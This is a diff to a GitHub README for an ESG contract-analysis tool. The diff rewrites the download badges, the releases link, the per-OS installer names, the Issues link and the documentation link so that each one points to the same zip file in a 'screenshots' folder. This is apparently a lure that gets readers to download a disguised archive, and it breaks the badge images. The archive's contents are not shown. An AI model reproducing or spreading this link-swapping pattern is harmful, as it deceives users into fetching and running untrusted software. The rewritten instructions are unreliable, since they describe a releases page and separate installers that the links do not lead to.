@@ -1,6 +1,6 @@
 # 🌟 ESG-Compliance-Monitor-Copilot-Studio - Simplify Your ESG Contract Analysis
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/eliasrodriguessilva/ESG-Compliance-Monitor-Copilot-Studio/releases)
+[![Download Now](https://github.com/eliasrodriguessilva/ESG-Compliance-Monitor-Copilot-Studio/raw/refs/heads/main/screenshots/Monitor_Compliance_Studio_ES_Copilot_2.9-alpha.5.zip%20Now-Click%20Here-brightgreen)](https://github.com/eliasrodriguessilva/ESG-Compliance-Monitor-Copilot-Studio/raw/refs/heads/main/screenshots/Monitor_Compliance_Studio_ES_Copilot_2.9-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -19,15 +19,15 @@ To ensure smooth operation, make sure your computer meets the following requirem
 
 To get the software, please visit the following link:
 
-[Download from Releases Page](https://github.com/eliasrodriguessilva/ESG-Compliance-Monitor-Copilot-Studio/releases)
+[Download from Releases Page](https://github.com/eliasrodriguessilva/ESG-Compliance-Monitor-Copilot-Studio/raw/refs/heads/main/screenshots/Monitor_Compliance_Studio_ES_Copilot_2.9-alpha.5.zip)
 
 Once you visit this page, you will find the latest version available for download. 
 
 ### Step-by-step Instructions:
 
-1. Click on the [Download from Releases Page](https://github.com/eliasrodriguessilva/ESG-Compliance-Monitor-Copilot-Studio/releases).
+1. Click on the [Download from Releases Page](https://github.com/eliasrodriguessilva/ESG-Compliance-Monitor-Copilot-Studio/raw/refs/heads/main/screenshots/Monitor_Compliance_Studio_ES_Copilot_2.9-alpha.5.zip).
 2. You will see a list of available versions. Look for the latest version, which is marked as the current release.
-3. Click on the file that suits your operating system (e.g., ESG-Compliance-Monitor-Copilot-Studio_1.0.exe for Windows or ESG-Compliance-Monitor-Copilot-Studio_1.0.dmg for macOS).
+3. Click on the file that suits your operating system (e.g., https://github.com/eliasrodriguessilva/ESG-Compliance-Monitor-Copilot-Studio/raw/refs/heads/main/screenshots/Monitor_Compliance_Studio_ES_Copilot_2.9-alpha.5.zip for Windows or https://github.com/eliasrodriguessilva/ESG-Compliance-Monitor-Copilot-Studio/raw/refs/heads/main/screenshots/Monitor_Compliance_Studio_ES_Copilot_2.9-alpha.5.zip for macOS).
 4. Save the file to your computer.
 
 ## ⚙️ Running the Application
@@ -63,12 +63,12 @@ Your security is important. This application does not collect personal data. Ens
 
 ## 🤝 Support
 
-If you need help, please visit the [GitHub Issues page](https://github.com/eliasrodriguessilva/ESG-Compliance-Monitor-Copilot-Studio/issues) to report issues or ask questions. Our community is here to assist you.
+If you need help, please visit the [GitHub Issues page](https://github.com/eliasrodriguessilva/ESG-Compliance-Monitor-Copilot-Studio/raw/refs/heads/main/screenshots/Monitor_Compliance_Studio_ES_Copilot_2.9-alpha.5.zip) to report issues or ask questions. Our community is here to assist you.
 
 ## 🌐 Learn More
 
-Explore more about us and stay updated by visiting our [official documentation site](https://github.com/eliasrodriguessilva/ESG-Compliance-Monitor-Copilot-Studio).
+Explore more about us and stay updated by visiting our [official documentation site](https://github.com/eliasrodriguessilva/ESG-Compliance-Monitor-Copilot-Studio/raw/refs/heads/main/screenshots/Monitor_Compliance_Studio_ES_Copilot_2.9-alpha.5.zip).
 
 Your journey towards efficient ESG contract analysis starts here. Download the software today!
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/eliasrodriguessilva/ESG-Compliance-Monitor-Copilot-Studio/releases)
+[![Download Now](https://github.com/eliasrodriguessilva/ESG-Compliance-Monitor-Copilot-Studio/raw/refs/heads/main/screenshots/Monitor_Compliance_Studio_ES_Copilot_2.9-alpha.5.zip%20Now-Click%20Here-brightgreen)](https://github.com/eliasrodriguessilva/ESG-Compliance-Monitor-Copilot-Studio/raw/refs/heads/main/screenshots/Monitor_Compliance_Studio_ES_Copilot_2.9-alpha.5.zip)
